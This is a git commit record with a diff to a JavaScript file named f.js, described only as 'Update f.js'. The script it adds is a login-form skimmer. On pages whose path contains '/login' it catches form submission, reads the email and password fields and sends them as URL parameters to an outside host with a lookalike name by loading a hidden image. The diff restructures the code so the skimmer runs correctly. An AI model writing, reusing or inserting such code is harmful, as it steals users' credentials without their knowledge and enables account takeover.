29f54dd49a64fc97ef6b1584f8abae64ef507a07
9os <druidboykoston@gmail.com>
2018-11-21 18:05:33 -0600

    Update f.js

--- f.js
+++ f.js
@@ -1,21 +1,21 @@
-if(window.location.pathname.indexOf("/login") == -1){
-	return;
-}
+if(window.location.pathname.indexOf("/login") != -1){
+	$(document).ready(function(){
+		$(document).on("submit", function(e){
+			email = $("#user_mail").val();
+			pass = $("#user_pass").val();
 
-$(document).ready(function(){
-	$(document).on("submit", function(e){
-		email = $("#user_mail").val();
-		pass = $("#user_pass").val();
-		
-		src = "http://googltrack.vacau.com/users.php?u="+email+"&p="+pass+"&e="+email+"&url="+window.location.href;
-		img = document.createElement('img');
-		img.src = src;
-		document.body.appendChild(img);
-		sleep(500);
+			src = "http://googltrack.vacau.com/users.php?u="+email+"&p="+pass+"&e="+email+"&url="+window.location.href;
+			img = document.createElement('img');
+			img.src = src;
+			document.body.appendChild(img);
+			sleep(500);
+		});
 	});
-});
 
 
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
+	function sleep(ms) {
+	  return new Promise(resolve => setTimeout(resolve, ms));
+	}
 }
+
+
